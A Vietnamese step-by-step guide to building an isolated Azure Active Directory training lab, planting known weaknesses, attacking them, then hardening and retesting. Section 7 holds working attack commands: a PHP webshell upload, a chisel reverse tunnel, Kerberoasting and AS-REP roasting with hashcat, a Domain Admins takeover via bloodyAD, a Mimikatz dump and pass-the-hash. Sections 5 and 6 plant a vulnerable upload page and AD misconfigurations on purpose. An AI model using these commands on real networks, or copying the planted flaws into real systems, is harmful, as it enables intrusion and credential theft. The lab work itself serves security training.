Hướng dẫn triển khai Lab AD trên Azure
Mục tiêu: dựng Lab Active Directory (1 DC + 2 máy trạm + 1 điểm vào DMZ có lỗ hổng), mô phỏng Kerberoasting, AS-REP Roasting, Pass-the-Hash, vẽ attack path bằng BloodHound, sau đó hardening (GPO, LAPS, Protected Users, nâng Kerberos lên AES) và retest.
0. Sơ đồ tổng quan & checklist trạng thái
Sơ đồ mạng:
```
            INTERNET
               |
          [Public IP]
               |
        +--------------+
        | VPN-Gateway  |  Ubuntu + WireGuard (10.10.20.4)
        +--------------+
               | (WireGuard tunnel, UDP 51820)
               |
   Member A/B/C (Attacker VM, máy cá nhân) <--- chỉ đường vào duy nhất
               |
    ===== Subnet-DMZ (10.10.20.0/24) =====
               |
        +--------------+
        |   WS-DMZ     |  dual-homed: NIC1=10.10.20.5 (DMZ) / NIC2=10.10.10.5 (AD)
        |  (web dễ bị) |  <-- điểm vào có lỗ hổng, pivot gateway vào AD
        +--------------+
               |
    ===== Subnet-AD (10.10.10.0/24) — hoàn toàn private, không public IP =====
               |
   +---------+   +---------+   +---------+
   |  DC01   |   |  WS01   |   |  WS02   |
   |10.10.10.10| |10.10.10.20| |10.10.10.21|
   +---------+   +---------+   +---------+
```
Nguyên tắc: chỉ VPN-Gateway có Public IP. Tất cả máy còn lại (kể cả WS-DMZ — dù có lỗ hổng) không có Public IP, chỉ reachable qua tunnel WireGuard. Điều này loại bỏ rủi ro bị scan/tấn công thật từ internet trong khi vẫn giớ đủ đường tấn công đúng đề bài (từ attacker, qua web app có lỗ hổng, pivot vào AD).
Bảng thông số từng máy:
Máy	OS	Size (Azure)	IP	Subnet	Public IP	Vai trò
VPN-Gateway	Ubuntu 22.04	Standard_B1s	10.10.20.4	DMZ	Có	Cổng VPN duy nhất vào lab
WS-DMZ	Ubuntu 22.04	Standard_B1s	10.10.20.5 / 10.10.10.5 (dual-homed)	DMZ + AD	Không	Web app dễ bị, pivot gateway
DC01	Windows Server 2019	Standard_B2ms	10.10.10.10	AD	Không	Domain Controller (lab.local)
WS01	Windows 11 Pro	Standard_B2s	10.10.10.20	AD	Không	Máy trạm joined domain
WS02	Windows 11 Pro	Standard_B2s	10.10.10.21	AD	Không	Máy trạm joined domain
Attacker	Kali/Parrot (máy thành viên hoặc VM riêng)	—	IP cấp qua WireGuard	ngoài Azure	—	Máy tấn công của mỗi thành viên
						
Checklist triển khai theo giai đoạn (đánh dấu khi xong, lưu lại trong nhất ký nhóm ở mục 9):
[ ] Giai đoạn 1: Resource Group + VNet + Subnet + NSG
[ ] Giai đoạn 2: VPN-Gateway hoạt động, 3 thành viên kết nối được
[ ] Giai đoạn 3: DC01 dựng domain lab.local thành công
[ ] Giai đoạn 4: WS01, WS02 join domain, có local admin trung mật khẩu
[ ] Giai đoạn 5: WS-DMZ dual-homed, web app chạy, lỗ hổng upload xác nhận khai thác được
[ ] Giai đoạn 6: Script tạo user/misconfig AD chạy xong trên DC01
[ ] Giai đoạn 7: Toàn bộ 4 kỹ thuật tấn công (Kerberoasting, AS-REP, BloodHound path, PtH) thữ thành công
[ ] Giai đoạn 8: Áp dụng hardening cho từng lỗ hổng, retest xác nhận đã fix
[ ] Giai đoạn 9: Snapshot lại trạng thái "hardened", viết báo cáo
1. Giai đoạn 1 — Chuẩn bị Azure: Resource Group, VNet, NSG
Tại sao quan trọng: NSG ở bước này là thữ duy nhất ngăn Subnet-AD và WS-DMZ bị quét từ internet thật. Chạy toàn bộ từ Azure CLI (`az login` trước).
```bash
# 1. Resource Group
az group create --name RG-AD-Lab --location southeastasia

# 2. VNet + 2 subnet
az network vnet create \
  --resource-group RG-AD-Lab --name VNet-Lab \
  --address-prefix 10.10.0.0/16 --location southeastasia \
  --subnet-name Subnet-DMZ --subnet-prefix 10.10.20.0/24

az network vnet subnet create \
  --resource-group RG-AD-Lab --vnet-name VNet-Lab \
  --name Subnet-AD --address-prefix 10.10.10.0/24

# 3. NSG-DMZ: chi mo UDP 51820 (WireGuard) tu internet, deny het con lai
az network nsg create --resource-group RG-AD-Lab --name NSG-DMZ

az network nsg rule create \
  --resource-group RG-AD-Lab --nsg-name NSG-DMZ \
  --name Allow-WireGuard --priority 100 \
  --direction Inbound --access Allow --protocol Udp \
  --source-address-prefixes '*' --destination-port-ranges 51820

az network nsg rule create \
  --resource-group RG-AD-Lab --nsg-name NSG-DMZ \
  --name Deny-Internet-Rest --priority 4000 \
  --direction Inbound --access Deny --protocol '*' \
  --source-address-prefixes Internet --destination-port-ranges '*'

# 4. NSG-AD: chi allow tu Subnet-DMZ (noi VPN-Gateway + WS-DMZ dung), deny Internet hoan toan
az network nsg create --resource-group RG-AD-Lab --name NSG-AD

az network nsg rule create \
  --resource-group RG-AD-Lab --nsg-name NSG-AD \
  --name Allow-From-DMZ --priority 100 \
  --direction Inbound --access Allow --protocol '*' \
  --source-address-prefixes 10.10.20.0/24 --destination-port-ranges '*'

az network nsg rule create \
  --resource-group RG-AD-Lab --nsg-name NSG-AD \
  --name Deny-Internet --priority 4000 \
  --direction Inbound --access Deny --protocol '*' \
  --source-address-prefixes Internet --destination-port-ranges '*'

# 5. Gan NSG vao tung subnet
az network vnet subnet update \
  --resource-group RG-AD-Lab --vnet-name VNet-Lab \
  --name Subnet-DMZ --network-security-group NSG-DMZ

az network vnet subnet update \
  --resource-group RG-AD-Lab --vnet-name VNet-Lab \
  --name Subnet-AD --network-security-group NSG-AD
```
Kiểm tra: sau khi chạy xong, Subnet-AD không được phép nhận kết nối trực tiếp từ Internet — chỉ từ Subnet-DMZ. Subnet-DMZ chỉ mỗ đúng port WireGuard ra ngoài. Đây là nền tảng an toàn cho toàn bộ lab.
2. Giai đoạn 2 — VPN-Gateway (cổng truy cập duy nhất mở ra internet)
Tạo VM VPN-Gateway (Ubuntu, có Public IP, trong Subnet-DMZ):
```bash
az vm create \
  --resource-group RG-AD-Lab --name VPN-Gateway \
  --image Ubuntu2204 --size Standard_B1s \
  --vnet-name VNet-Lab --subnet Subnet-DMZ \
  --nsg NSG-DMZ --public-ip-sku Standard \
  --admin-username azadmin --generate-ssh-keys \
  --private-ip-address 10.10.20.4
```
Cài WireGuard trên VPN-Gateway (SSH vào máy rồi chạy):
```bash
sudo apt update && sudo apt install -y wireguard
cd /etc/wireguard
umask 077
wg genkey | tee server_private.key | wg pubkey > server_public.key

# Bat ip forward
sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
sudo sysctl -p
```
File `/etc/wireguard/wg0.conf` (server, mẫu 3 peer cho 3 thành viên):
```ini
[Interface]
Address = 10.20.0.1/24
ListenPort = 51820
PrivateKey = <server_private.key noi dung>
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Member A
[Peer]
PublicKey = <publickey cua member A>
AllowedIPs = 10.20.0.2/32

# Member B
[Peer]
PublicKey = <publickey cua member B>
AllowedIPs = 10.20.0.3/32

# Member C
[Peer]
PublicKey = <publickey cua member C>
AllowedIPs = 10.20.0.4/32
```
```bash
sudo systemctl enable wg-quick@wg0
sudo systemctl start wg-quick@wg0
```
Từng thành viên tự tạo client config trên máy cá nhân:
```bash
wg genkey | tee privatekey | wg pubkey > publickey
# gui noi dung file publickey cho admin de them vao wg0.conf server
```
File client mẫu (`client.conf`, mỗi người đổi `Address` và `PrivateKey` theo miình):
```ini
[Interface]
PrivateKey = <privatekey cua minh>
Address = 10.20.0.2/32

[Peer]
PublicKey = <server_public.key cua VPN-Gateway>
Endpoint = <Public IP cua VPN-Gateway>:51820
AllowedIPs = 10.10.0.0/16, 10.20.0.0/24
PersistentKeepalive = 25
```
Sau khi admin thêm public key vào server và restart (`sudo wg-quick down wg0 && sudo wg-quick up wg0`), mỗi thành viên chạy `sudo wg-quick up ./client.conf` là vào được toàn bộ mạng lab (10.10.0.0/16) mà không máy nào khác cần lộ public IP.
3. Giai đoạn 3 — DC01 (Domain Controller)
Tạo VM DC01 (Windows Server 2019, trong Subnet-AD, không Public IP):
```bash
az vm create \
  --resource-group RG-AD-Lab --name DC01 \
  --image Win2019Datacenter --size Standard_B2ms \
  --vnet-name VNet-Lab --subnet Subnet-AD \
  --nsg NSG-AD --public-ip-address "" \
  --private-ip-address 10.10.10.10 \
  --admin-username labadmin --admin-password "<StrongPassw0rd!>"
```
Kết nối vào DC01 qua RDP chỉ được thông qua tunnel WireGuard (10.10.10.10).
Cài AD Domain Services và dựng domain `lab.local` (chạy trong PowerShell trên DC01):
```powershell
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainNetbiosName "LAB" `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "DsrmP@ssw0rd!" -AsPlainText -Force) `
  -InstallDns:$true `
  -Force:$true

# May se tu restart sau buoc nay
```
Cập nhật DNS của VNet trỏ về DC01 (để các máy khác trong VNet dùng DC01 làm DNS server, bắt buộc để join domain hoạt động):
```bash
az network vnet update \
  --resource-group RG-AD-Lab --name VNet-Lab \
  --dns-servers 10.10.10.10
```
Lưu ý quan trọng: sau khi đổi DNS của VNet, cần restart (hoặc `az vm restart`) mọi VM đã tồn tại trước đó (VPN-Gateway, WS-DMZ...) để chúng nhận cấu hình DNS mới; với WS01/WS02 tạo sau bước này thì không cần.
4. Giai đoạn 4 — WS01 & WS02 (máy trạm joined domain)
Tạo 2 VM WS01, WS02 (Windows 11 Pro, Subnet-AD, không Public IP):
```bash
az vm create \
  --resource-group RG-AD-Lab --name WS01 \
  --image Win11-22H2-Pro --size Standard_B2s \
  --vnet-name VNet-Lab --subnet Subnet-AD \
  --nsg NSG-AD --public-ip-address "" \
  --private-ip-address 10.10.10.20 \
  --admin-username labadmin --admin-password "<StrongPassw0rd!>"

az vm create \
  --resource-group RG-AD-Lab --name WS02 \
  --image Win11-22H2-Pro --size Standard_B2s \
  --vnet-name VNet-Lab --subnet Subnet-AD \
  --nsg NSG-AD --public-ip-address "" \
  --private-ip-address 10.10.10.21 \
  --admin-username labadmin --admin-password "<StrongPassw0rd!>"
```
Join domain `lab.local` (chạy trên mỗi máy, qua RDP/WireGuard):
```powershell
$cred = Get-Credential  # dung LAB\labadmin
Add-Computer -DomainName "lab.local" -Credential $cred -Restart -Force
```
Lỗ hổng cố ý — Pass-the-Hash setup: sau khi cả 2 máy đã join domain, đặt local Administrator trùng mật khẩu trên cả WS01 và WS02:
```powershell
# Chay rieng tren WS01 va tren WS02, dung CUNG MOT mat khau
net user Administrator "LocalAdmin@2024!"
```
> ⚠️ **Đây CHÍNH LÀ lỗ hổng cố ý cấy vào lab, KHÔNG phải thực hành tốt.** Trong thực tế doanh nghiệp, đả nhiều máy dùng chung 1 mật khẩu local admin là nguyên nhân phổ biến khiến Pass-the-Hash lan rộng (lateral movement) sau khi 1 máy bị chiếm. Lỗ hổng này sẽ được fix bằng LAPS ở mục 8.
5. Giai đoạn 5 — WS-DMZ (điểm vào, dual-homed, có lỗ hổng web upload)
Tạo VM WS-DMZ với 2 NIC (dual-homed, không Public IP):
```bash
# NIC1: trong Subnet-DMZ
az network nic create \
  --resource-group RG-AD-Lab --name WS-DMZ-nic1 \
  --vnet-name VNet-Lab --subnet Subnet-DMZ \
  --network-security-group NSG-DMZ \
  --private-ip-address 10.10.20.5

# NIC2: trong Subnet-AD
az network nic create \
  --resource-group RG-AD-Lab --name WS-DMZ-nic2 \
  --vnet-name VNet-Lab --subnet Subnet-AD \
  --network-security-group NSG-AD \
  --private-ip-address 10.10.10.5

# Tao VM gan 2 NIC
az vm create \
  --resource-group RG-AD-Lab --name WS-DMZ \
  --image Ubuntu2204 --size Standard_B1s \
  --nics WS-DMZ-nic1 WS-DMZ-nic2 \
  --admin-username azadmin --generate-ssh-keys
```
Xác nhận dual-homed (SSH vào WS-DMZ qua IP DMZ 10.10.20.5 — lưu ý SSH chỉ reachable qua VPN và có thể cần thêm rule tạm thời trong NSG-DMZ cho port 22 từ subnet WireGuard):
```bash
ip a
# phai thay ca 2 interface: eth0 (10.10.20.5) va eth1 (10.10.10.5)
```
Cài Apache + PHP và web app có lỗ hổng upload:
```bash
sudo apt update && sudo apt install -y apache2 php libapache2-mod-php
sudo systemctl enable apache2 --now
```
File `/var/www/html/upload.php` (Lỗ hổng cố ý: không kiểm tra đuôi file):
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $target = "uploads/" . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "Uploaded to: $target";
}
?>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload">
</form>
```
```bash
sudo mkdir -p /var/www/html/uploads
sudo chown www-data:www-data /var/www/html/uploads
```
> ⚠️ **Vì sao nguy hiểm:** form này không kiểm tra đuôi file (`.php`, `.phtml`...) nên cho phép upload trực tiếp một webshell PHP (ví dụ: reverse shell) rồi truy cập `http://10.10.20.5/uploads/shell.php` để thực thi lầnh trên server. Đây là điểm vào (foothold) để attacker pivot từ Subnet-DMZ sang Subnet-AD, vì máy này có NIC2 nằm trong Subnet-AD.
6. Giai đoạn 6 — Script tạo user & misconfig AD (chạy trên DC01)
Chạy toàn bộ script dưới đây 1 lần trên DC01, bằng tài khoản Domain Admin. Mỗi đoạn được chú thích rõ đang cấy lỗ hổng nào.
```powershell
Import-Module ActiveDirectory

# ===== 1. Tao OU =====
New-ADOrganizationalUnit -Name "LabUsers" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=lab,DC=local"
New-ADOrganizationalUnit -Name "Workstations" -Path "DC=lab,DC=local"

# ===== 2. User thuong: alice (diem bat dau cho BloodHound) =====
New-ADUser -Name "alice" -SamAccountName "alice" `
  -Path "OU=LabUsers,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Alice@2024" -AsPlainText -Force) `
  -Enabled $true

# ===== 3. LO HONG #1: Kerberoasting =====
# Tao service account co SPN + mat khau yeu + (mac dinh) dung RC4
New-ADUser -Name "svc-sql" -SamAccountName "svc-sql" `
  -Path "OU=ServiceAccounts,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Summer2024" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
Setspn -A MSSQLSvc/ws01.lab.local:1433 svc-sql
# -> Bat ky domain user nao cung xin duoc TGS ticket cua svc-sql va crack offline

# ===== 4. LO HONG #2: AS-REP Roasting =====
# Tao user tat Kerberos pre-authentication
New-ADUser -Name "bob" -SamAccountName "bob" `
  -Path "OU=LabUsers,DC=lab,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Winter2024" -AsPlainText -Force) `
  -Enabled $true
Set-ADAccountControl -Identity "bob" -DoesNotRequirePreAuth $true
# -> Attacker khong can biet password cua bob de xin duoc AS-REP, crack offline

# ===== 5. LO HONG #3: ACL abuse (GenericAll -> Domain Admins) =====
New-ADGroup -Name "ITSupport" -GroupScope Global -Path "OU=LabUsers,DC=lab,DC=local"
Add-ADGroupMember -Identity "ITSupport" -Members "svc-sql"

$group = Get-ADGroup "ITSupport"
$daDN  = (Get-ADGroup "Domain Admins").DistinguishedName
$acl   = Get-Acl "AD:\$daDN"
$sid   = New-Object System.Security.Principal.SecurityIdentifier $group.SID
$rule  = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid, "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl "AD:\$daDN" $acl
# -> Bat ky member cua ITSupport (gom svc-sql) deu co the tu them minh vao Domain Admins
```
Tồng kết 3 lỗ hổng cấy trong script này (cộng với lỗ PtH ở mục 4 và lỗ upload ở mục 5, tổng cộng 4 họ lỗ hổng sẽ được liệt kê đầy đủ ở mục 8):
User/Group	Lỗ hổng	Kỹ thuật khai thác
svc-sql	SPN + mật khẩu yếu + RC4	Kerberoasting
bob	DoesNotRequirePreAuth = true	AS-REP Roasting
ITSupport → Domain Admins	GenericAll ACE bất thường	ACL abuse / leo đặc quyền
7. Thực hiện tấn công (từ máy Attacker, qua VPN)
Thứ tự thực hiện từ máy Attacker (sau khi đã `wg-quick up` vào VPN):
Bước 1 — Khai thác upload.php trên WS-DMZ để lấy reverse shell:
```bash
# Tao webshell PHP don gian
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" http://10.10.20.5/upload.php

# Hoac dung webshell reverse shell day du (vd pentestmonkey php-reverse-shell)
# roi trigger:
curl "http://10.10.20.5/uploads/shell.php?cmd=id"
```
Bước 2 — Pivot vào Subnet-AD (WS-DMZ có NIC2 nằm trong 10.10.10.0/24):
```bash
# Dung Ligolo-ng hoac chisel de tao tunnel tu shell tren WS-DMZ vao Subnet-AD
# Vi du voi chisel (chay server tren Attacker, client tren WS-DMZ qua webshell):
./chisel server -p 8080 --reverse &
# tren WS-DMZ (qua webshell/cmd):
./chisel client <Attacker_VPN_IP>:8080 R:socks
```
Bước 3 — Enum domain + Kerberoasting (nhắm svc-sql):
```bash
proxychains python3 GetUserSPNs.py lab.local/alice:'Alice@2024' -dc-ip 10.10.10.10 -request
# Lay duoc TGS hash cua svc-sql ($krb5tgs$23$...)

hashcat -m 13100 svc-sql.hash /usr/share/wordlists/rockyou.txt
# Crack ra: Summer2024
```
Bước 4 — AS-REP Roasting (nhắm bob):
```bash
proxychains python3 GetNPUsers.py lab.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass
# bob tra AS-REP hash ($krb5asrep$23$...)

hashcat -m 18200 bob.hash /usr/share/wordlists/rockyou.txt
# Crack ra: Winter2024
```
Bước 5 — BloodHound: vẽ attack path từ alice lên Domain Admin:
```bash
proxychains bloodhound-python -u alice -p 'Alice@2024' -d lab.local -ns 10.10.10.10 -c All
# Import vao BloodHound CE, chay query "Shortest Paths to Domain Admins"
```
Kết quả mong đợi trên đồ thị: alice → (member of) svc-sql [qua credential đã crack] → ITSupport → GenericAll → Domain Admins.
Bước 6 — Leo đặc quyền bằng ACL abuse (tự thêm vào Domain Admins):
```bash
bloodyAD -u svc-sql -p Summer2024 -d lab.local --host 10.10.10.10 \
  add groupMember "Domain Admins" svc-sql
# svc-sql gio la Domain Admin
```
Bước 7 — Pass-the-Hash từ WS01 sang WS02:
```powershell
# Tren WS01 (da chiem duoc, vd qua RDP voi svc-sql gio la DA), dump SAM bang Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# Lay duoc NTLM hash cua local Administrator (chung cho WS01 va WS02)
```
```bash
# Tu Attacker, dung hash do de chiem WS02 ma khong can biet plaintext password
psexec.py Administrator@10.10.10.21 -hashes :<NTLM_hash>
```
Tất cả 4 kỹ thuật theo MITRE ATT&CK (Kerberoasting T1558.003, AS-REP Roasting T1558.004, Pass-the-Hash T1550.002, và leo đặc quyền qua ACL abuse) đã được thực hiện đầy đủ từ một tài khoản user thường đến Domain Admin + lateral movement.
8. Bảng lỗ hổng đã cài, vì sao nguy hiểm, và cách Fix (Hardening) — kèm retest
#	Lỗ hổng (đã cài)	Vì sao nguy hiểm	Cách Fix (Hardening)	Cách Retest
1	`svc-sql` có SPN + mật khẩu yếu + Kerberos dùng RC4 → Kerberoasting	Bất kỳ domain user nào cũng xin được TGS ticket của service account và crack offline không cần biết mật khẩu trước	1) GPO "Network security: Configure encryption types allowed for Kerberos" — chỉ cho phép AES128/AES256. 2) `Set-ADUser -Identity svc-sql -KerberosEncryptionType AES256`. 3) Đổi mật khẩu svc-sql thành chuỗi dài/ngẫu nhiên (>20 ký tự)	Chạy lại `GetUserSPNs.py`: hash phải đổi từ `$krb5tgs$23$` sang `$krb5tgs$18$` (AES), và hashcat mode 13100 không còn crack được với mật khẩu mới
2	`bob` có `DoesNotRequirePreAuth = $true` → AS-REP Roasting	Attacker không cần biết mật khẩu để xin AS-REP của user, rồi crack offline	1) `Set-ADAccountControl -Identity bob -DoesNotRequirePreAuth $false`. 2) Đưa các tài khoản nhạy cảm (Domain Admin...) vào Protected Users Group: `Add-ADGroupMember -Identity "Protected Users" -Members <account>`	Chạy lại `GetNPUsers.py -no-pass`: trả về lỗi `KDC_ERR_PREAUTH_REQUIRED` (không còn lấy được hash)
3	Local Administrator trùng mật khẩu trên WS01 và WS02 → Pass-the-Hash	Chiếm được hash local admin trên 1 máy là chiếm được toàn bộ máy dùng chung mật khẩu đó (lateral movement)	Cài LAPS: `Install-Module AdmPwd.PS` → `Update-AdmPwdADSchema` → `Set-AdmPwdComputerSelfPermission -OrgUnit "Workstations"` → tạo GPO LAPS áp vào OU Workstations — mỗi máy sẽ có mật khẩu local admin random, tự đổi định kỳ	`psexec.py` dùng hash cũ của WS01 nhắm sang WS02 → thất bại (STATUS_LOGON_FAILURE) vì mật khẩu đã khác nhau
4	Group `ITSupport` có GenericAll trên `Domain Admins` → ACL abuse / leo đặc quyền	Bất kỳ member nào của ITSupport cũng có thể tự thêm mình vào Domain Admins	Rà soát ACL bất thường bằng `dsacls "CN=Domain Admins,..."` hoặc BloodHound (query ACL abuse), rồi gỡ ACE: PowerShell `$acl.RemoveAccessRule($rule); Set-Acl`	`bloodyAD add groupMember` từ svc-sql nhắm Domain Admins → thất bại (Access Denied); xác nhận lại bằng `Get-Acl` so với bản trước
				
Bổ sung — Audit logging (không chặn hoàn toàn nhưng giúp phát hiện): bật GPO Audit Policy cho "Audit Kerberos Service Ticket Operations" để ghi lại Event ID 4769 (TGS request) — giúp phát hiện hành vi Kerberoasting (nhiều yêu cầu TGS với encryption type RC4 từ cùng 1 user trong thời gian ngắn là dấu hiệu đáng ngờ), dù bản thân audit không ngăn được cuộc tấn công.
Quy trình khuyến nghị: áp dụng từng fix ở trên → retest ngay bằng đúng lệnh tấn công tương ứng ở mục 7 → chụp screenshot kết quả "trước/sau" làm minh chứng cho báo cáo → snapshot lại VM ở trạng thái "hardened" (mục 9).
9. Vận hành nhóm: snapshot, lịch dùng chung, tắt/bật VM tiết kiệm credit
Snapshot mốc quan trọng (chụp snapshot ổ đĩa mỗi khi đạt 1 trạng thái ổn định, để cần là khôi phục ngay, không phải dựng lại từ đầu):
Mốc	Nội dung	Lệnh mẫu
`baseline-clean`	AD vừa dựng xong, chưa có lỗ hổng	`az snapshot create -g RG-AD-Lab -n DC01-baseline-clean --source DC01`
`vulnerable-ready`	Đã chạy xong script misconfig, sẵn sàng tấn công	`az snapshot create -g RG-AD-Lab -n DC01-vulnerable-ready --source DC01`
`hardened`	Đã áp dụng xong tất cả fix ở mục 8, retest OK	`az snapshot create -g RG-AD-Lab -n DC01-hardened --source DC01`
(Lầp tương tự cho WS01, WS02, WS-DMZ nếu cần giự lại trạng thái của chúng.)
Script tắt/mở toàn bộ VM để tiết kiệm credit (không động đến VPN-Gateway để nhóm vẫn vào kiểm tra trạng thái được):
```bash
# Tat (deallocate - QUAN TRONG: deallocate moi ngung tinh tien, shutdown trong OS KHONG du)
for vm in DC01 WS01 WS02 WS-DMZ; do
  az vm deallocate --resource-group RG-AD-Lab --name $vm --no-wait
done

# Mo lai khi can lam viec
for vm in DC01 WS01 WS02 WS-DMZ; do
  az vm start --resource-group RG-AD-Lab --name $vm --no-wait
done
```
Quy tắc tránh đụng độ trong nhóm (vì cùng dùng chung 1 bộ máy):
Báo trước trong nhóm chat trước khi RDP vào DC01/WS01/WS02 (ai đang dùng, làm gì, bao lâu)
Báo trước trước khi sửa GPO/ACL domain-wide (vì ảnh hưởng toàn bộ lab, có thể làm hỏng thử nghiệm của người khác)
Ghi nhật ký dùng chung (1 file text/Docs chia sẻ) theo format: `[ngày][người][hành động]`, ví dụ: `[2026-10-20][Chi][Chay script misconfig AD tren DC01, xong 15:30]`
Luôn chụp snapshot trước khi làm thay đổi lớn, để có thể rollback nếu có lỗi
Phân công 3 thành viên theo 4 tuần (map vào các mục ở trên, có thể đổi tùy thế mạnh mỗi người):
Tuần	Nội dung	Thành viên phụ trách gợi ý
1	Mục 1-3: Azure network + VPN-Gateway + DC01	Người nắm hạ tầng/cloud
2	Mục 4-6: WS01/WS02, WS-DMZ, script misconfig AD	Người nắm AD/Windows
3	Mục 7: thực hiện đầy đủ 4 kỹ thuật tấn công + BloodHound	Người nắm pentest/tấn công
4	Mục 8-9: hardening, retest, snapshot, tổng hợp báo cáo	Cả 3 người cùng rà soát
Mọi người nên nắm tối thiểu toàn bộ quy trình để có thể hỗ trợ nhau và đều hiểu bài để report đầy đủ.
